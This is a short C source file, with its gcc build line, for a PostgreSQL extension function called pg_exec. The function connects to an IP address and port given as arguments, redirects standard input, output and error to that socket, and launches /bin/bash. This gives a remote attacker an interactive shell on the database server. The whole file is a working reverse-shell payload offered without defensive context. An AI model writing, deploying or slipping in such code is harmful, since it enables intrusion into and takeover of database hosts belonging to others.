//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include<stdio.h>
#include<stdlib.h>
#include <arpa/inet.h>

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
    char* ip = PG_GETARG_CSTRING(0);
    char* port = PG_GETARG_CSTRING(1);

    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    sa.sin_port = htons(atoi(port));

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    
    while (true)
    {
        execve("/bin/bash", 0, 0);
    }
    PG_RETURN_INT32(0);
}
